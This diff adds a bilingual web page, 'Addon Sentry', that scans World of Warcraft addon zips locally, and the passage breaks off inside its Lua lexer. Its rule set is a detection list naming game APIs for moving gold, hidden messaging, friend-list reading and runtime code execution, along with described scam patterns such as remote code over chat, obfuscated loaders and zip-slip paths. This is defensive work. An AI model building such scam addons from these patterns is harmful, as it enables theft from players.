@@ -1,0 +1,1280 @@
+<title>Addon Sentry</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<meta name="description" content="Revisá un addon de World of Warcraft antes de instalarlo. El archivo no sale de tu compu.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Stencil+Display:wght@600;800&family=Atkinson+Hyperlegible:ital,wght@0,400;0,700;1,400&family=IBM+Plex+Mono:wght@400;500&display=swap">
+<style>
+/* Layout: a customs inspection slip. The tray (drop zone) on top, the verdict stamped onto the report, evidence as a ledger. */
+:root {
+  --paper: #eef1f3;
+  --sheet: #fbfcfc;
+  --ink: #18222c;
+  --muted: #5b6874;
+  --rule: #cfd6dc;
+  --accent: #1d5c63;
+  --accent-ink: #ffffff;
+  --crit: #b3261e;
+  --high: #c4561b;
+  --med: #a5770a;
+  --low: #3b6e8f;
+  --ok: #2e7d4f;
+  --tray: #e3e8ec;
+  --display: "Big Shoulders Stencil Display", "Arial Narrow", "Roboto Condensed", sans-serif;
+  --body: "Atkinson Hyperlegible", "Segoe UI", system-ui, sans-serif;
+  --mono: "IBM Plex Mono", ui-monospace, "Cascadia Mono", Consolas, monospace;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --paper: #12181d; --sheet: #182027; --ink: #e4e9ed; --muted: #97a3ad; --rule: #2c3842; --accent: #5fb3ba; --accent-ink: #0d1418;
+    --crit: #f2776d; --high: #f0955e; --med: #e2b84a; --low: #7fb4d6; --ok: #6cc48f; --tray: #1d272f; color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --paper: #12181d; --sheet: #182027; --ink: #e4e9ed; --muted: #97a3ad; --rule: #2c3842; --accent: #5fb3ba; --accent-ink: #0d1418;
+  --crit: #f2776d; --high: #f0955e; --med: #e2b84a; --low: #7fb4d6; --ok: #6cc48f; --tray: #1d272f; color-scheme: dark;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--paper); color: var(--ink); font: 16px/1.55 var(--body);
+  padding-left: max(16px, env(safe-area-inset-left, 0px)); padding-right: max(16px, env(safe-area-inset-right, 0px)); padding-block: 28px 48px;
+}
+.wrap { max-width: 920px; margin: 0 auto; display: grid; gap: 28px; }
+header { display: grid; gap: 6px; }
+.brandline { display: flex; align-items: baseline; justify-content: space-between; gap: 12px; flex-wrap: wrap; }
+h1 { font: 800 clamp(40px, 8vw, 64px)/0.9 var(--display); letter-spacing: 0.02em; margin: 0; text-transform: uppercase; }
+.tag { margin: 0; color: var(--muted); max-width: 60ch; }
+.lang { display: inline-flex; border: 1px solid var(--rule); border-radius: 999px; overflow: hidden; }
+.lang button { font: 500 13px var(--mono); padding: 6px 12px; border: 0; background: transparent; color: var(--muted); cursor: pointer; }
+.lang button[aria-pressed="true"] { background: var(--ink); color: var(--paper); }
+button:focus-visible, label:focus-within, a:focus-visible { outline: 3px solid var(--accent); outline-offset: 2px; }
+
+/* tray */
+.tray {
+  display: grid; gap: 14px; padding: 22px; border-radius: 14px; background: var(--tray);
+  border: 2px dashed color-mix(in srgb, var(--ink) 30%, transparent); transition: border-color .15s, background .15s;
+}
+.tray.over { border-color: var(--accent); background: color-mix(in srgb, var(--accent) 12%, var(--tray)); }
+.tray-main { display: flex; gap: 16px; align-items: center; flex-wrap: wrap; justify-content: space-between; }
+.tray-text { display: grid; gap: 2px; min-width: 0; }
+.tray-text strong { font: 700 19px var(--body); }
+.tray-text span { color: var(--muted); font-size: 14px; }
+.pick { display: inline-flex; align-items: center; gap: 8px; background: var(--accent); color: var(--accent-ink); font: 700 15px var(--body); padding: 11px 18px; border-radius: 10px; cursor: pointer; }
+.pick input { position: absolute; width: 1px; height: 1px; opacity: 0; }
+.examples { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; font-size: 14px; color: var(--muted); }
+.examples button { font: 500 13px var(--mono); padding: 6px 10px; border-radius: 8px; border: 1px solid var(--rule); background: var(--sheet); color: var(--ink); cursor: pointer; }
+.examples button[aria-pressed="true"] { border-color: var(--accent); box-shadow: inset 0 0 0 1px var(--accent); }
+.privacy { display: flex; gap: 8px; align-items: flex-start; font-size: 14px; color: var(--muted); margin: 0; }
+.privacy svg { flex: none; margin-top: 2px; }
+
+/* report sheet */
+.sheet { background: var(--sheet); border: 1px solid var(--rule); border-radius: 6px; padding: 26px clamp(18px, 4vw, 34px); display: grid; gap: 22px; position: relative; }
+.sheet-head { display: grid; grid-template-columns: 1fr auto; gap: 18px; align-items: start; }
+@media (max-width: 560px) { .sheet-head { grid-template-columns: 1fr; } }
+.eyebrow { font: 500 12px var(--mono); letter-spacing: 0.12em; text-transform: uppercase; color: var(--muted); margin: 0; }
+.example-flag { color: var(--med); }
+.target { font: 700 22px/1.25 var(--body); margin: 4px 0 2px; overflow-wrap: anywhere; }
+.meta { color: var(--muted); font-size: 14px; margin: 0; overflow-wrap: anywhere; }
+.stamp {
+  justify-self: end; transform: rotate(-6deg); border: 4px solid currentColor; border-radius: 8px; padding: 8px 16px 6px;
+  font: 800 30px/1 var(--display); letter-spacing: 0.06em; text-transform: uppercase; text-align: center; max-width: 260px;
+  background: color-mix(in srgb, currentColor 7%, transparent);
+}
+.stamp small { display: block; font: 500 11px var(--mono); letter-spacing: 0.12em; margin-top: 4px; }
+@media (max-width: 560px) { .stamp { justify-self: start; } }
+.lvl-critical { color: var(--crit); } .lvl-high { color: var(--high); } .lvl-medium { color: var(--med); }
+.stamp.lvl-low, .stamp.lvl-info { color: var(--ok); }
+.finding.lvl-low { color: var(--low); } .finding.lvl-info { color: var(--muted); }
+@media (prefers-reduced-motion: no-preference) { .stamp.fresh { animation: thunk .35s cubic-bezier(.2, 1.6, .4, 1); } }
+@keyframes thunk { from { transform: rotate(-14deg) scale(1.6); opacity: 0; } to { transform: rotate(-6deg) scale(1); opacity: 1; } }
+
+h2 { font: 800 22px/1 var(--display); letter-spacing: 0.04em; text-transform: uppercase; margin: 0 0 10px; }
+.caps { display: flex; flex-wrap: wrap; gap: 8px; margin: 0; padding: 0; list-style: none; }
+.caps li { border: 1px solid var(--rule); border-radius: 999px; padding: 5px 12px; font-size: 14px; display: inline-flex; gap: 8px; align-items: baseline; }
+.caps li b { font: 500 12px var(--mono); color: var(--muted); }
+.none { color: var(--muted); margin: 0; }
+
+.findings { display: grid; gap: 12px; margin: 0; padding: 0; list-style: none; }
+.finding { border-left: 5px solid currentColor; padding: 2px 0 2px 14px; display: grid; gap: 6px; }
+.finding .sev { font: 500 12px var(--mono); letter-spacing: 0.1em; text-transform: uppercase; }
+.finding h3 { font: 700 17px/1.3 var(--body); margin: 0; color: var(--ink); }
+.finding p { margin: 0; color: var(--muted); max-width: 70ch; }
+.ledger { margin: 4px 0 0; padding: 8px 10px; list-style: none; background: color-mix(in srgb, var(--ink) 4%, transparent); border-radius: 6px; overflow-x: auto; display: grid; gap: 4px; }
+.ledger li { font: 13px/1.45 var(--mono); color: var(--ink); white-space: pre; }
+.ledger .loc { color: var(--muted); }
+.ledger .more { color: var(--muted); font-style: italic; white-space: normal; }
+details.quiet summary { cursor: pointer; color: var(--muted); font-size: 14px; }
+details.quiet[open] summary { margin-bottom: 10px; }
+
+.disclaimer { border-top: 1px solid var(--rule); padding-top: 14px; margin: 0; font-size: 14px; color: var(--muted); max-width: 75ch; }
+.error { border-left: 5px solid var(--crit); padding: 10px 14px; background: color-mix(in srgb, var(--crit) 8%, transparent); border-radius: 0 6px 6px 0; margin: 0; }
+.busy { color: var(--muted); font: 500 14px var(--mono); }
+
+.how { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 18px 28px; }
+.how div { min-width: 0; }
+.how h2 { font-size: 18px; }
+.how p, .how ul { margin: 0; color: var(--muted); font-size: 15px; }
+.how ul { padding-left: 18px; display: grid; gap: 4px; }
+footer { color: var(--muted); font-size: 13px; text-align: left; }
+</style>
+
+<div class="wrap">
+  <header>
+    <div class="brandline">
+      <h1>Addon Sentry</h1>
+      <div class="lang" role="group" aria-label="Idioma / Language">
+        <button type="button" data-lang="es" aria-pressed="true">ES</button>
+        <button type="button" data-lang="en" aria-pressed="false">EN</button>
+      </div>
+    </div>
+    <p class="tag" data-t="tagline"></p>
+  </header>
+
+  <section class="tray" id="tray" aria-labelledby="tray-title">
+    <div class="tray-main">
+      <div class="tray-text">
+        <strong id="tray-title" data-t="drop"></strong>
+        <span data-t="dropHint"></span>
+      </div>
+      <label class="pick">
+        <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 16V4m0 0-5 5m5-5 5 5M4 20h16"/></svg>
+        <span data-t="choose"></span>
+        <input type="file" id="file" accept=".zip,application/zip">
+      </label>
+    </div>
+    <div class="examples" id="examples"><span data-t="tryExample"></span></div>
+    <p class="privacy">
+      <svg width="16" height="16" viewBox="0 0 24 24" aria-hidden="true" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V8a4 4 0 0 1 8 0v3"/></svg>
+      <span data-t="privacy"></span>
+    </p>
+  </section>
+
+  <section class="sheet" id="report" aria-live="polite"></section>
+
+  <section class="how">
+    <div>
+      <h2 data-t="howTitle"></h2>
+      <p data-t="howText"></p>
+    </div>
+    <div>
+      <h2 data-t="looksTitle"></h2>
+      <ul id="looks"></ul>
+    </div>
+    <div>
+      <h2 data-t="limitsTitle"></h2>
+      <p data-t="limitsText"></p>
+    </div>
+  </section>
+  <footer data-t="footer"></footer>
+</div>
+
+<script>var ADDON_SENTRY_RULES = {"capabilities": {"money": {"api": ["AcceptTrade", "AddTradeMoney", "AutoLootMailItem", "AutoStoreGuildBankItem", "BuyMerchantItem", "BuybackItem", "C_AuctionHouse.CancelAuction", "C_AuctionHouse.ConfirmCommoditiesPurchase", "C_AuctionHouse.PlaceBid", "C_AuctionHouse.PostCommodity", "C_AuctionHouse.PostItem", "C_AuctionHouse.StartCommoditiesPurchase", "C_BlackMarket.ItemPlaceBid", "C_Container.UseContainerItem", "CancelAuction", "ClickSendMailItemButton", "ClickTargetTradeButton", "ClickTradeButton", "DeleteCursorItem", "DepositGuildBankMoney", "DropItemOnUnit", "InitiateTrade", "PickupGuildBankItem", "PickupPlayerMoney", "PlaceAuctionBid", "PostAuction", "ReturnInboxItem", "SendMail", "SetSendMailCOD", "SetSendMailMoney", "SetTradeMoney", "SplitGuildBankItem", "StartAuction", "TakeInboxItem", "TakeInboxMoney", "WithdrawGuildBankMoney"], "en": "Moves gold or items (mail, trade, auction house, guild bank, vendors, deleting items)", "es": "Mueve oro u objetos (correo, comercio, casa de subastas, banco de la guild, vendedores, borrar objetos)"}, "chat": {"api": ["BNSendGameData", "BNSendWhisper", "C_BattleNet.SendGameData", "C_BattleNet.SendWhisper", "C_ChatInfo.RegisterAddonMessagePrefix", "C_ChatInfo.SendAddonMessage", "C_ChatInfo.SendAddonMessageLogged", "C_ChatInfo.SendChatMessage", "JoinChannelByName", "JoinPermanentChannel", "JoinTemporaryChannel", "SendAddonMessage", "SendChatMessage"], "en": "Sends chat, whispers or hidden addon messages", "es": "Manda mensajes de chat, susurros o mensajes ocultos de addon"}, "code": {"api": ["RunScript", "getfenv", "load", "loadstring", "setfenv", "setmetatable(_G"], "en": "Builds and runs code at runtime", "es": "Arma y ejecuta código mientras corre"}, "account": {"api": ["BNGetFriendInfo", "BNGetInfo", "BNGetNumFriends", "C_BattleNet.GetAccountInfoByGUID", "C_BattleNet.GetAccountInfoByID", "C_BattleNet.GetFriendAccountInfo", "C_FriendList.GetFriendInfoByIndex", "C_FriendList.GetNumFriends", "GetGuildBankMoney", "GetGuildRosterInfo", "GetMoney"], "en": "Reads account data (BattleTag, friends list, guild roster, gold)", "es": "Lee datos de la cuenta (BattleTag, lista de amigos, roster de la guild, oro)"}, "sabotage": {"api": ["AbandonQuest", "AbandonSkill", "C_GuildInfo.Demote", "C_GuildInfo.Leave", "C_GuildInfo.RemoveFromGuild", "C_PartyInfo.LeaveParty", "C_QuestLog.AbandonQuest", "ForceQuit", "GuildDemote", "GuildDisband", "GuildLeave", "GuildSetLeader", "GuildUninvite", "LeaveParty", "Logout", "Quit"], "en": "Can disband or kick from the guild, log out, leave the group or abandon progress", "es": "Puede disolver la guild o echar gente, desconectarte, salir del grupo o abandonar progreso"}, "profiling": {"api": ["C_PaperDollInfo.GetInspectItemLevel", "GetComparisonAchievementPoints", "GetComparisonCategoryNumAchievements", "GetComparisonStatistic", "GetInspectHonorData", "GetPlayerInfoByGUID", "NotifyInspect", "SetAchievementComparisonUnit"], "en": "Inspects other players or reads their statistics", "es": "Inspecciona a otros jugadores o lee sus estadísticas"}, "macros": {"api": ["CreateMacro", "DeleteMacro", "EditMacro", "SaveBindings", "SetBinding", "SetBindingClick", "SetBindingItem", "SetBindingMacro", "SetBindingSpell", "SetOverrideBinding", "SetOverrideBindingClick"], "en": "Creates or edits macros and key bindings", "es": "Crea o modifica macros y atajos de teclado"}}, "sensitive_hook_targets": ["AcceptTrade", "BuyMerchantItem", "C_AuctionHouse.ConfirmCommoditiesPurchase", "C_AuctionHouse.GetCommoditySearchResultInfo", "C_AuctionHouse.GetItemSearchResultInfo", "C_AuctionHouse.PlaceBid", "C_AuctionHouse.StartCommoditiesPurchase", "C_ChatInfo.SendChatMessage", "ChatFrame_OnHyperlinkShow", "GetAuctionItemInfo", "GetCoinTextureString", "GetMoney", "GetMoneyString", "InitiateTrade", "MoneyFrame_Update", "PlaceAuctionBid", "SendChatMessage", "SendMail", "SetItemRef", "SetMoneyFrameColor", "SetTradeMoney", "StaticPopup_Hide", "StaticPopup_OnClick", "StaticPopup_Show", "StaticPopup_Visible"], "sensitive_frame_prefixes": ["StaticPopup1", "StaticPopup2", "StaticPopup3", "StaticPopup4", "TradeFrame", "SendMailFrame", "SendMailMailButton", "MailFrame", "OpenMailFrame", "InboxFrame", "AuctionHouseFrame", "AuctionFrame", "GuildBankFrame", "MerchantFrame"], "hiding_filter_events": ["CHAT_MSG_BN_WHISPER", "CHAT_MSG_BN_WHISPER_INFORM", "CHAT_MSG_CURRENCY", "CHAT_MSG_LOOT", "CHAT_MSG_MONEY", "CHAT_MSG_SYSTEM", "CHAT_MSG_TRADESKILLS", "CHAT_MSG_WHISPER", "CHAT_MSG_WHISPER_INFORM"], "remote_input_events": ["BN_CHAT_MSG_ADDON", "CHAT_MSG_ADDON", "CHAT_MSG_ADDON_LOGGED", "CHAT_MSG_BN_WHISPER", "CHAT_MSG_CHANNEL", "CHAT_MSG_GUILD", "CHAT_MSG_INSTANCE_CHAT", "CHAT_MSG_OFFICER", "CHAT_MSG_PARTY", "CHAT_MSG_PARTY_LEADER", "CHAT_MSG_RAID", "CHAT_MSG_RAID_LEADER", "CHAT_MSG_SAY", "CHAT_MSG_WHISPER", "CHAT_MSG_YELL"], "executable_extensions": [".app", ".bat", ".cmd", ".com", ".cpl", ".dll", ".dmg", ".exe", ".hta", ".jar", ".js", ".jse", ".lnk", ".msi", ".msp", ".pkg", ".ps1", ".psm1", ".reg", ".scr", ".sys", ".vbe", ".vbs", ".wsf", ".wsh"], "script_extensions": [".command", ".dylib", ".pl", ".py", ".rb", ".sh", ".so"], "archive_extensions": [".7z", ".bz2", ".cab", ".gz", ".iso", ".rar", ".tar", ".tgz", ".xz", ".zip"], "addon_extensions": [".blp", ".bmp", ".code-workspace", ".csv", ".editorconfig", ".gif", ".gitattributes", ".gitignore", ".gitmodules", ".htm", ".html", ".jpeg", ".jpg", ".json", ".license", ".lua", ".luacheckrc", ".luarc", ".m2", ".md", ".mp3", ".ogg", ".otf", ".pkgmeta", ".png", ".svg", ".tga", ".toc", ".ttf", ".txt", ".wav", ".xml", ".yaml", ".yml"], "severities": ["info", "low", "medium", "high", "critical"], "severity_names": {"en": {"info": "info", "low": "low", "medium": "medium", "high": "high", "critical": "critical"}, "es": {"info": "info", "low": "bajo", "medium": "medio", "high": "alto", "critical": "crítico"}}, "findings": {"PKG_EXECUTABLE": {"severity": "critical", "en": ["Executable file in the addon", "WoW never runs files like this from an addon. A download that asks you to run one is almost always malware."], "es": ["Archivo ejecutable dentro del addon", "WoW nunca ejecuta archivos así desde un addon. Si una descarga te pide abrir uno, casi siempre es malware."]}, "PKG_PATH_TRAVERSAL": {"severity": "critical", "en": ["File path escapes the addon folder", "Unzipping this would write files outside the folder (\"zip slip\"), for example into your startup folder."], "es": ["Ruta que sale de la carpeta del addon", "Al descomprimirlo escribiría archivos fuera de la carpeta (\"zip slip\"), por ejemplo en el inicio de Windows."]}, "PKG_SCRIPT": {"severity": "low", "en": ["Developer script in the addon", "Build or tooling scripts are common in source repositories. The game never runs them; do not run them yourself unless you know what they do."], "es": ["Script de desarrollo dentro del addon", "Los scripts de build o herramientas son comunes en los repos. El juego nunca los ejecuta; no los ejecutes vos salvo que sepas qué hacen."]}, "PKG_ENCRYPTED": {"severity": "medium", "en": ["Password-protected files", "The scanner cannot see inside them, and addons have no reason to ship encrypted files."], "es": ["Archivos con contraseña", "El escáner no puede ver qué tienen, y un addon no tiene motivo para traer archivos encriptados."]}, "PKG_NESTED_ARCHIVE": {"severity": "medium", "en": ["Archive inside the archive", "The scanner cannot see inside it. Addons do not need nested archives; check where it came from."], "es": ["Archivo comprimido adentro del comprimido", "El escáner no puede ver qué tiene. Los addons no necesitan comprimidos adentro; fijate de dónde salió."]}, "PKG_UNUSUAL_FILE": {"severity": "low", "en": ["File type the game does not use", "Not dangerous by itself, but unusual in an addon."], "es": ["Tipo de archivo que el juego no usa", "No es peligroso por sí solo, pero es raro en un addon."]}, "PKG_NO_TOC": {"severity": "low", "en": ["No .toc file", "Without a .toc the game does not load it, so this is not a working addon as packaged."], "es": ["No hay archivo .toc", "Sin .toc el juego no lo carga: así como viene no es un addon que funcione."]}, "PKG_UNLOADED_LUA": {"severity": "info", "en": ["Lua file not loaded by any .toc", "The game will not run it unless another file loads it."], "es": ["Archivo Lua que ningún .toc carga", "El juego no lo ejecuta, salvo que otro archivo lo cargue."]}, "REMOTE_CODE": {"severity": "critical", "en": ["Can run code sent by other players", "It listens to chat or addon messages and also builds and runs code. Whoever sends the right message could run anything as you: trade away your gold, send mail, whisper scams to your friends."], "es": ["Puede ejecutar código que manden otros jugadores", "Escucha mensajes de chat o de addons y además arma y ejecuta código. Quien mande el mensaje justo podría hacer cualquier cosa en tu nombre: comerciar tu oro, mandar correo, susurrar estafas a tus amigos."]}, "OBFUSCATED_LOADER": {"severity": "critical", "en": ["Hidden code that runs more code", "Part of the code is encoded so people cannot read it, and it is decoded and run. Legitimate addons have no reason to do this."], "es": ["Código escondido que ejecuta más código", "Una parte del código está codificada para que no se pueda leer, y se decodifica y ejecuta. Un addon legítimo no tiene motivo para hacer esto."]}, "HIDDEN_MONEY": {"severity": "critical", "en": ["Moves gold or items and hides it", "It can move gold or items and also hides confirmations or chat notices about it. This is the pattern of the auction house scams."], "es": ["Mueve oro u objetos y lo esconde", "Puede mover oro u objetos y además esconde las confirmaciones o los avisos del chat. Es el patrón de las estafas de la casa de subastas."]}, "BLIZZARD_OVERRIDE_SENSITIVE": {"severity": "high", "en": ["Replaces a Blizzard function about money or confirmations", "Replacing this function lets an addon show you something different from what really happens (a price, your gold, a confirmation)."], "es": ["Reemplaza una función de Blizzard de plata o confirmaciones", "Reemplazar esta función permite mostrarte algo distinto de lo que pasa en realidad (un precio, tu oro, una confirmación)."]}, "SENSITIVE_FRAME": {"severity": "low", "en": ["Changes or clicks a money confirmation window", "It changes the behaviour of, or clicks, a window that confirms gold or item movement. Convenience addons do this too (auto-accept); combined with hiding it is a scam pattern."], "es": ["Modifica o aprieta una ventana que confirma plata", "Cambia el comportamiento de una ventana que confirma movimientos de oro u objetos, o la aprieta sola. Los addons de comodidad también lo hacen (aceptar automático); junto con esconder cosas es un patrón de estafa."]}, "MONEY_AND_HIDING": {"severity": "medium", "en": ["Moves gold or items and also filters chat or confirms windows", "Convenience addons do both (auto-sell junk, hide spam, auto-accept). Check that the addon is what it says it is and where you downloaded it."], "es": ["Mueve oro u objetos y además filtra el chat o acepta ventanas solo", "Los addons de comodidad hacen las dos cosas (vender basura, esconder spam, aceptar solo). Fijate que el addon sea lo que dice y de dónde lo bajaste."]}, "LISTENS_AND_RUNS": {"severity": "low", "en": ["Listens to other players and runs code built at runtime", "One file listens to chat or addon messages and another one runs code it builds at runtime. The scanner cannot follow the data between files, so check whether received text reaches the code runner."], "es": ["Escucha a otros jugadores y ejecuta código armado en el momento", "Un archivo escucha mensajes de chat o de addons y otro ejecuta código que arma en el momento. El escáner no puede seguir los datos entre archivos: hay que mirar si el texto recibido llega al que ejecuta."]}, "HIDING_FILTER": {"severity": "low", "en": ["Hides chat messages about gold, loot or whispers", "Chat filters are common (spam blockers), but filtering system, money or whisper messages can hide what an addon did."], "es": ["Esconde mensajes del chat sobre oro, botín o susurros", "Los filtros de chat son comunes (anti-spam), pero filtrar mensajes del sistema, de oro o susurros puede esconder lo que hizo un addon."]}, "SENSITIVE_HOOK": {"severity": "info", "en": ["Hooks a Blizzard function about money or chat", "A hook runs after Blizzard's function; it cannot change it, but it can react (for example hide a window right after it opens)."], "es": ["Se engancha a una función de Blizzard de plata o chat", "El gancho corre después de la función de Blizzard: no la cambia, pero puede reaccionar (por ejemplo cerrar una ventana apenas se abre)."]}, "EXFILTRATION": {"severity": "low", "en": ["Reads your friends list and sends messages", "It reads your Battle.net or in-game friends and can send hidden messages. Showing friends is normal for chat and social addons; sending them somewhere is not."], "es": ["Lee tu lista de amigos y manda mensajes", "Lee tus amigos de Battle.net o del juego y puede mandar mensajes ocultos. Mostrar amigos es normal en addons de chat y sociales; mandarlos a algún lado, no."]}, "DYNAMIC_CODE": {"severity": "low", "en": ["Builds and runs code at runtime", "Normal for developer tools and import strings; otherwise worth a look. What matters is where the code comes from."], "es": ["Arma y ejecuta código mientras corre", "Es normal en herramientas para desarrolladores y en strings de importación; si no, conviene mirarlo. Lo importante es de dónde sale ese código."]}, "INDIRECT_GLOBAL": {"severity": "low", "en": ["Calls functions by computed name", "It looks up game functions with a name built at runtime (e.g. _G[\"Send\"..\"Mail\"]), which hides what it calls from readers and scanners."], "es": ["Llama funciones con un nombre calculado", "Busca funciones del juego con un nombre armado en el momento (por ejemplo _G[\"Send\"..\"Mail\"]), lo que esconde qué llama."]}, "BUILT_API_NAME": {"severity": "high", "en": ["Builds the name of a sensitive function piece by piece", "Splitting the name of a money or chat function into pieces only makes sense to avoid being noticed."], "es": ["Arma de a pedazos el nombre de una función sensible", "Partir en pedazos el nombre de una función de plata o chat solo tiene sentido para que no se note."]}, "OBFUSCATION": {"severity": "medium", "en": ["Hard-to-read code", "Long encoded strings, character-code tricks or scrambled names. Compressed profile data is legitimate; scrambled code is not common in addons."], "es": ["Código difícil de leer", "Strings codificados largos, trucos con códigos de caracteres o nombres revueltos. Los perfiles comprimidos son legítimos; el código revuelto no es común en addons."]}, "SABOTAGE": {"severity": "low", "en": ["Can disband or kick from the guild, or log you out", "Guild tools legitimately kick and demote; other addons have no reason to."], "es": ["Puede disolver o echar gente de la guild, o desconectarte", "Las herramientas de guild echan y degradan gente legítimamente; otros addons no tienen por qué."]}, "GUILD_DISBAND": {"severity": "high", "en": ["Can disband the guild", "Disbanding is a one-click, irreversible action that almost no addon needs."], "es": ["Puede disolver la guild", "Disolver es una acción irreversible que casi ningún addon necesita."]}, "PROFILING": {"severity": "medium", "en": ["Collects statistics about other players and saves them", "It reads other players' statistics (such as gold earned) and the addon keeps saved data. Check what it stores about people and whether it shares it."], "es": ["Junta estadísticas de otros jugadores y las guarda", "Lee estadísticas de otros jugadores (como el oro ganado) y el addon guarda datos. Fijate qué guarda de la gente y si lo comparte."]}, "MACRO_WRITE": {"severity": "low", "en": ["Creates or edits macros or key bindings", "Normal for action bar and macro addons. A macro can run any command when you press the key."], "es": ["Crea o modifica macros o atajos", "Es normal en addons de barras y macros. Una macro puede ejecutar cualquier comando cuando apretás la tecla."]}, "URL": {"severity": "info", "en": ["Contains links", "Most are the author's site or Discord. Do not paste links from an addon into your browser without checking them."], "es": ["Tiene links", "La mayoría son la web o el Discord del autor. No pegues en el navegador links que te muestre un addon sin revisarlos."]}}, "verdicts": {"critical": {"en": "Dangerous", "es": "Peligroso"}, "high": {"en": "Suspicious", "es": "Sospechoso"}, "medium": {"en": "Review", "es": "Revisar"}, "low": {"en": "No warning signs", "es": "Sin señales de riesgo"}, "info": {"en": "No warning signs", "es": "Sin señales de riesgo"}}, "disclaimer": {"en": "This is an automatic check of the code's patterns. It cannot prove an addon is safe, and a warning is not proof of bad intent. When in doubt, download addons only from their official page.", "es": "Es un chequeo automático de patrones en el código. No puede probar que un addon sea seguro, y una advertencia no prueba mala intención. Ante la duda, bajá los addons solo de su página oficial."}};</script>
+<script>/* addon-sentry engine, JavaScript port of src/addon_sentry (lexer, lua, engine).
+ * Runs in the browser and in Node 18+. The zip never leaves the device.
+ * Rule data comes from rules.json, generated from rules.py, so both engines share it.
+ * tests/test_parity.py runs both engines on the same zips and requires identical reports.
+ */
+(function (root, factory) {
+  if (typeof module === "object" && module.exports) module.exports = factory();
+  else root.AddonSentry = factory();
+})(typeof self !== "undefined" ? self : this, function () {
+  "use strict";
+
+  const VERSION = "0.1.0";
+  const NAME = "name", NUMBER = "number", STRING = "string", OP = "op", KEYWORD = "keyword", COMMENT = "comment";
+  const KEYWORDS = new Set("and break do else elseif end false for function goto if in local nil not or repeat return then true until while".split(" "));
+  const OPS = ["...", "..", "==", "~=", "<=", ">=", "<<", ">>", "//", "::", ..."+-*/%^#&~|<>=(){}[];:,.".split("")];
+
+  class ScanError extends Error {}
+  // Upper half of code page 437, the default encoding for zip names without the UTF-8 flag (as Python's zipfile)
+  const CP437 = "ÇüéâäàåçêëèïîìÄÅÉæÆôöòûùÿÖÜ¢£¥₧ƒáíóúñÑªº¿⌐¬½¼¡«»░▒▓│┤╡╢╖╕╣║╗╝╜╛┐└┴┬├─┼╞╟╚╔╩╦╠═╬╧╨╤╥╙╘╒╓╫╪┘┌█▄▌▐▀αßΓπΣσµτΦΘΩδ∞φε∩≡±≥≤⌠⌡÷≈°∙·√ⁿ²■\u00a0";
+
+  // ------------------------------------------------------------------ lexer
+
+  function tok(kind, value, line, col, pos) {
+    return { kind, value, line, col, pos };
+  }
+  const isOp = (t, ...v) => t && t.kind === OP && v.includes(t.value);
+  const isKw = (t, ...v) => t && t.kind === KEYWORD && v.includes(t.value);
+
+  const ESC = { n: "\n", t: "\t", r: "\r", a: "\x07", b: "\b", f: "\f", v: "\v", "\\": "\\", '"': '"', "'": "'", "\n": "\n" };
+  function unquote(body) {
+    if (body.indexOf("\\") < 0) return body;
+    let out = "", i = 0;
+    while (i < body.length) {
+      const ch = body[i];
+      if (ch === "\\" && i + 1 < body.length) {
+        const nx = body[i + 1];
+        if (Object.prototype.hasOwnProperty.call(ESC, nx)) { out += ESC[nx]; i += 2; continue; }
+        if (nx >= "0" && nx <= "9") {
+          const m = /^\d{1,3}/.exec(body.slice(i + 1));
+          out += String.fromCharCode(parseInt(m[0], 10) % 256);
+          i += 1 + m[0].length;
+          continue;
+        }
+      }
+      out += ch;
+      i += 1;
+    }
+    return out;
+  }
+
+  const NAME_RE = /[A-Za-z_][A-Za-z0-9_]*/y;
+  const NUMBER_RE = /0[xX](?:[0-9A-Fa-f]*\.?[0-9A-Fa-f]+|[0-9A-Fa-f]+\.?)(?:[pP][+-]?[0-9]+)?|(?:[0-9]+\.?[0-9]*|\.[0-9]+)(?:[eE][+-]?[0-9]+)?/y;
+  const LONG_OPEN_RE = /\[(=*)\[/y;
+
+  function tokenize(source, keepComments) {
+    const tokens = [];
+    let i = 0;
+    const n = source.length;
+    let line = 1, lineStart = 0;
+    if (source.startsWith("#")) { i = source.indexOf("\n"); if (i < 0) i = n; }
+
+    function emit(kind, start, end, value) {
+      const text = source.slice(start, end);
+      const startLine = line, col = start - lineStart + 1;
+      let nl = 0, last = -1;
+      for (let k = 0; k < text.length; k++) if (text.charCodeAt(k) === 10) { nl++; last = k; }
+      if (nl) { line += nl; lineStart = start + last + 1; }
+      if (kind !== COMMENT || keepComments) tokens.push(tok(kind, value === undefined ? text : value, startLine, col, start));
+    }
+
+    while (i < n) {
+      const c = source[i];
+      if (c === "\n") { line++; i++; lineStart = i; continue; }
+      if (c === " " || c === "\t" || c === "\r" || c === "\f" || c === "\v") { i++; continue; }
+      if (source.startsWith("--", i)) {
+        LONG_OPEN_RE.lastIndex = i + 2;
+        const m = LONG_OPEN_RE.exec(source);
+        let end;
+        if (m) {
+          const close = "]" + m[1] + "]";
+          end = source.indexOf(close, LONG_OPEN_RE.lastIndex);
+          end = end < 0 ? n : end + close.length;
+        } else {
+          end = source.indexOf("\n", i);
+          if (end < 0) end = n;
+        }
+        emit(COMMENT, i, end);
+        i = end;
+        continue;
+      }
+      if (c === '"' || c === "'") {
+        let j = i + 1;
+        while (j < n) {
+          const ch = source[j];
+          if (ch === "\\") { j += 2; continue; }
+          if (ch === c || ch === "\n") break;
+          j++;
+        }
+        const end = Math.min(j + 1, n);
+        emit(STRING, i, end, unquote(source.slice(i + 1, Math.min(j, n))));
+        i = end;
+        continue;
+      }
+      if (c === "[") {
+        LONG_OPEN_RE.lastIndex = i;
+        const m = LONG_OPEN_RE.exec(source);
+        if (m) {
+          const close = "]" + m[1] + "]";
+          let end = source.indexOf(close, LONG_OPEN_RE.lastIndex);
+          const bodyEnd = end < 0 ? n : end;
+          end = end < 0 ? n : end + close.length;
+          let body = source.slice(LONG_OPEN_RE.lastIndex, bodyEnd);
+          if (body.startsWith("\r\n")) body = body.slice(2);
